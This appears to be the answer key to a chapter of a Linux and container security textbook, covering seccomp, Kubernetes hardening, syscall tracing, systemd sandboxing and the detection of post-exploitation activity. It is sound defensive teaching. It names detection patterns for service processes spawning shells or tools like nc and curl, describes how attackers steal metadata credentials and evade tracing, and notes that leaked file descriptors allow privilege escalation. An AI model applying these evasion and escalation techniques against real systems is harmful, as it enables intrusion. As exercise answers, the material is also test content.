`execve` replaces the process image: all existing mappings are torn down and the new
executable plus its interpreter are mapped fresh. Security benefit: no state from the
previous program — including secrets, and including any attacker-injected code — survives
into the new image, and the credential recalculation is a clean, auditable transition point
where bounding sets and `no_new_privs` apply. Forensic drawback: an attacker who execs
destroys the in-memory evidence of the exploitation that preceded it, so if you rely on
memory forensics you have lost. This is a strong argument for capturing `execve` events at
the moment they occur (eBPF/auditd) rather than depending on post-hoc inspection.

### 2.6
Exit code 139 = 128 + 11 = `SIGSEGV`. Order: (1) Confirm it is a segfault, not an OOM kill
(137/`SIGKILL`) — `kubectl describe pod` reason, and node `dmesg`. (2) Compare the two
environments' *differences*, since the image is the same: CPU architecture (an arm64 node in
a mixed cluster running an amd64-only image, or vice versa, is the classic), seccomp profile
(Kubernetes may apply `RuntimeDefault` where Docker applied Docker's own), and
securityContext (read-only rootfs, dropped capabilities, non-root UID). (3) Reproduce with
`kubectl debug` or by running the image with the same securityContext locally. Three most
likely causes: architecture mismatch; a missing mounted file or config causing a crash in a
native component; a stricter seccomp/AppArmor profile in the cluster. Check `dmesg` on the
node for both `seccomp` and `segfault` lines — they name the syscall or the faulting
address.

### 2.7
`strace -f -e trace=%file <command>` (or attach to the running PID), looking for the first
`openat`/`access`/`stat` that returns `EACCES` or `ENOENT`. The .NET exception tells you a
permission problem occurred; the syscall tells you the exact path and errno. Almost always
the cause is a bind-mounted volume or a `COPY`-ed directory owned by root with mode 0644/0755
where UID 10001 needs write, or a writable path required at runtime (a keyring/DataProtection
directory, a temp path) that a read-only root filesystem denies.

### 2.8
The upload path calls a syscall not present in the profile — commonly `memfd_create`,
`fallocate`, `ftruncate`, `renameat2`, `copy_file_range`, or `statfs` — and the profile's
default action is `SCMP_ACT_KILL_PROCESS`, so the kernel terminates the process immediately.
No exception is logged because the process is killed by the kernel, not by an error return;
the runtime never gets control to unwind. Confirm with `dmesg | grep -i seccomp` (which
prints the pid and the syscall number) or `ausearch -m SECCOMP`, then decode the number with
`ausyscall`. Remediation: add the syscall; and more importantly, change the default action
to `SCMP_ACT_ERRNO` during rollout so failures are graceful and diagnosable, or run with
`SCMP_ACT_LOG` in staging first to build the profile from real behavior including rare paths.

### 2.9
(1) **Distinct UIDs per service, and non-root.** Shared UID 1000 means any compromised
service can `ptrace` the others and read their memory — including secrets it was never
granted. This converts one compromise into six. (2) **`automountServiceAccountToken: false`
where unused, and minimal RBAC where used.** The token is a cluster credential sitting in
the filesystem of every pod; it is the standard pivot from container compromise to cluster
compromise (Ch. 101–102). (3) **`RuntimeDefault` seccomp plus `drop: ALL` capabilities.**
This removes a large block of kernel attack surface and the escape-enabling capabilities.
Order matters: 1 and 2 stop lateral movement that is available *without any exploit*, while
3 raises the cost of an exploit that may not exist yet. Fix the free wins first.

### 2.10
(a) How code executed: `execve` events from eBPF/auditd with parent PID chains (`execsnoop`);
the API process spawning `/bin/sh` is the signal. Also check for `memfd_create`+`execveat`
(fileless), and `mprotect` making a writable page executable (in-process payload). Correlate
with application logs and the WAF/ALB access log for the request that immediately preceded
it. (b) What they did next: subsequent `execve`s; `connect()` calls to external addresses
(especially 169.254.169.254 — metadata theft); `openat` of
`/var/run/secrets/kubernetes.io/serviceaccount/token`; DNS queries; new listening sockets.
(c) Escape: `mount`/`unshare`/`setns` syscalls; writes to `/proc/sys/*` or the cgroup
filesystem; access to `/var/run/docker.sock`; `init_module`; any process appearing on the
host outside the container's cgroup. Cross-check the Kubernetes audit log and CloudTrail for
API calls originating from that node's identity in the same window.

### 2.11
First-party microservices: known, measurable behavior, so build tight per-service seccomp
allow-lists from observed syscalls (§8.1), `drop: ALL` capabilities, non-root distinct UIDs,
read-only rootfs, default-deny egress NetworkPolicy. Containers on a shared kernel are
proportionate because the code is yours and the tenant separation is logical. Third-party
plugins: untrusted code by definition, so the container rung is not adequate — run them in
microVMs (Firecracker/Kata) or a WASM sandbox, with no cloud credentials, no service account
token, no egress, hard CPU/memory/wall-clock limits, and single-use sandboxes never reused
across tenants. Monitoring differs accordingly: for first-party, alert on deviation from the
known syscall profile (a new `execve`, any `mprotect` exec, any connection to the metadata
IP). For plugins, assume malice and monitor for escape attempts (`mount`, `unshare`,
`setns`, kernel module loads), resource abuse, and any egress at all — plus sandbox crash
rate as a canary for exploitation attempts.

### 2.12
**auditd**: broad coverage of syscalls and file access, mature, integrates with compliance
requirements; but high overhead under load (it is in the syscall path and can drop events or
even stall the system if the backlog fills), noisy, rule syntax is painful, and it is
container-unaware (you get PIDs, not pod names). **eBPF (Falco/Tetragon)**: low overhead,
kernel-side so it cannot be evaded by direct syscalls or libc tricks, container/Kubernetes
metadata enrichment, flexible; but requires a recent kernel, tooling maturity varies, and
naive implementations that hook only syscall tracepoints miss io_uring. **SECCOMP_RET_USER_NOTIF**:
synchronous, can *block* rather than merely observe, and is precise; but it puts a userspace
supervisor in the critical path of every filtered syscall (latency and availability risk),
covers only syscalls you filter, and is complex to operate at fleet scale. Recommendation:
eBPF-based tooling as the primary, with a tight seccomp profile as *prevention* underneath
it — detection and prevention are different jobs and you want both. I would change my mind if
the fleet ran kernels too old for modern eBPF (then auditd, tuned narrowly), or if a specific
compliance regime mandated auditd records, or if a workload genuinely required synchronous
policy decisions on specific syscalls (then add USER_NOTIF for those alone).

### 2.13
Expected approach: `sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("%d %d %s %s\n", pid, ppid, comm, str(args->filename)); }'`
(note `ppid` may need `curtask->real_parent->tgid`). Classification comes from the parent:
cron-spawned processes have `cron`/`CRON` ancestry; systemd timers have `systemd` as parent
with a `.service` unit; shell commands descend from your terminal's shell. A useful detection
rule: alert on `execve` whose parent is a *service* process that is not expected to spawn
children — for example, `dotnet`, `nginx`, `node`, `postgres` spawning `sh`, `bash`, `curl`,
`wget`, `python`, `nc`. That single rule catches a large fraction of real web-application RCE
in practice, and is exactly the shape of Falco's default "Terminal shell in container" and
"Program run in container" rules.

### 2.14
Expected directives and what each prevents: `User=`/`DynamicUser=` (runs unprivileged);
`NoNewPrivileges=yes` (blocks setuid escalation); `CapabilityBoundingSet=` empty (no
capabilities can ever be acquired); `ProtectSystem=strict` (whole filesystem read-only except
explicit `ReadWritePaths`, preventing persistence via binary or unit modification);
`ProtectHome=yes` (no access to user data or SSH keys); `PrivateTmp=yes` (blocks `/tmp` race
and cross-service tmp snooping); `PrivateDevices=yes` (no raw disk access, which would bypass
file permissions entirely); `ProtectKernelTunables=yes` and `ProtectKernelModules=yes`
(blocks sysctl tampering and module loading); `RestrictNamespaces=yes` (blocks user-namespace
tricks used in escapes); `RestrictSUIDSGID=yes` (cannot drop a setuid backdoor);
`SystemCallFilter=@system-service` plus `~@privileged @module @mount @debug` (seccomp);
`LockPersonality=yes`; `MemoryDenyWriteExecute=yes` where the runtime permits it. Note the
JIT caveat for .NET/Node.

### 2.15
The program opens a file readable only by root (say `/etc/shadow`) while running as root,
obtains fd 3, then calls `setresuid(1000,1000,1000)`, then `read(3, ...)` — which succeeds.
Explanation: the kernel performs the permission check at `open()` time and records the
granted access in the `struct file`. Subsequent `read()` calls check only that the fd is
valid and was opened for reading; they do not re-evaluate the process's credentials against
the inode. The file descriptor therefore *is* the capability, in the strict sense of the
term. This is why leaked descriptors across `fork`/`execve` are a real escalation path, why
`O_CLOEXEC` exists, and why privilege-dropping daemons deliberately open what they need
before dropping.

### 2.16
Expected shape: the compiler emits `mov eax, 1` (SYS_write), arguments in `RDI`/`RSI`/`RDX`,
then `syscall`. The CPU saves `RIP`→`RCX` and `RFLAGS`→`R11`, loads the kernel entry point
from `IA32_LSTAR`, switches to ring 0, and (under KPTI) switches `CR3` to the kernel page
tables. The entry stub runs `swapgs`, switches to the kernel stack, and saves the user
registers into `pt_regs`. seccomp evaluates the filter. The kernel validates the fd against
`current->files`, obtains the `struct file`, checks it was opened writable, and dispatches
through `f_op->write_iter`. For a regular file the data is copied (`copy_from_user`, with
address validation) into the page cache, pages are marked dirty, and writeback happens later
— so the call returns before anything reaches the disk unless `O_SYNC`/`fsync` is used. For
a socket the data goes to the socket send buffer and the TCP stack takes over (Chapter 19).
The byte count goes into `RAX`, registers are restored, `CR3` is switched back, and `SYSRET`
returns to ring 3. Bonus: mention that a short write is legal and must be handled, and that
the return value can be a negative errno.

### 2.17
At the kernel level there is no distinction: both are `task_struct` entries on the same run
queue, each with its own TID. The difference is which structures they share, determined by
the `clone()` flags: threads share `mm_struct` (address space), `files_struct` (descriptor
table), `fs_struct`, signal handlers, and — critically — the `cred` structure. Security
consequence: **there is no security boundary between threads**. They share identity, so any
credential check that passes for one passes for all; they share memory, so any secret one
holds is readable by all; and they share descriptors, so any resource one opened is usable
by all. Practically, this is why multi-tenant isolation implemented with thread-local state
is only as strong as the application code, and why a compromise anywhere in a process is a
compromise of everything that process holds.

### 2.18
A VM boundary is enforced by the hypervisor with hardware support (EPT/NPT second-level
translation, VMX/SVM modes): the guest kernel cannot address host memory at all, and the
interface between them is a small number of exits handled by a comparatively small
hypervisor. A container boundary is enforced by *bookkeeping inside one shared kernel* —
namespaces filter what identifiers a process can see, cgroups limit resources, capabilities
and seccomp restrict operations. The container's processes still call directly into the same
~30 million lines of kernel code as the host's. Therefore any kernel vulnerability reachable
from an allowed syscall (Dirty COW, Dirty Pipe, io_uring bugs, netfilter bugs) escapes the
container, and no runtime configuration prevents that. Additionally, parts of the kernel
interface are not namespaced at all (`/sys` partially, `dmesg`, some sysctls, the kernel
keyring, time until recently). Containers are an excellent *hardening* boundary and a poor
*trust* boundary; use VMs/microVMs where mutually untrusted code shares hardware.

### 2.19
The argument: root in a container is real UID 0 on the host kernel, restricted only by
capabilities and namespaces. A single missing flag (`--privileged`, an added `CAP_SYS_ADMIN`,
a mounted Docker socket, a hostPath mount) turns it into host root. Running as root also
means any file-write primitive can modify the application's own binaries or configuration
for persistence, and it removes the file-permission layer that would otherwise limit a
compromise. Non-root costs almost nothing: one `USER` line and correct ownership. What could
go wrong in the migration — and this is the part that earns credibility: files baked into the
image or in mounted volumes will be root-owned and become unwritable (fix ownership at build
time, or use `fsGroup`); ports below 1024 will fail to bind (move to 8080 and let the
Service/ALB map 443); some base images assume a writable `$HOME` or a writable temp path
(supply a `tmpfs`); and package managers or entrypoint scripts that expect to write to the
filesystem will break under a read-only rootfs. Plan for those four, and the migration is a
day of work, not a risk.

### 2.20
Detection: a shell process (`sh`, `bash`) `execve`'d by a service process that never spawns
children; a socket connection initiated *outbound* from a process whose role is to accept
inbound connections; file descriptors 0/1/2 of a shell pointing at a socket rather than a
tty (`ls -l /proc/PID/fd` showing `socket:[...]` on stdin/stdout — a very high-signal
indicator); DNS lookups for unknown domains from a workload with a fixed dependency set;
egress to a non-allowlisted destination in VPC Flow Logs. Falco's `Reverse shell` and
`Terminal shell in container` rules encode exactly these. Evasion an attacker would attempt:
avoid spawning a shell at all and operate in-process (so watch `mprotect` PROT_EXEC and
`memfd_create`); use io_uring for I/O to bypass syscall tracepoints; tunnel the shell over an
existing allowed connection (HTTPS to a CDN-fronted C2, or over DNS) so no new destination
appears; use a legitimate binary already present (living off the land — `curl`, `python`);
and time activity to blend with normal load. The counter is defense in depth: block `execve`
where unnecessary, deny egress by default, and alert on the *absence* of expected behavior as
well as the presence of unexpected behavior.

---

*Next: Chapter 3 — Files, Descriptors, Sockets, and Ports: How a Program Reaches the World.
We will follow the file descriptor abstraction from §4.5 all the way out to a listening TCP
socket, and see exactly what "a process is listening on port 443" means to the kernel — the
foundation for every firewall, security group, and NetworkPolicy in this book.*
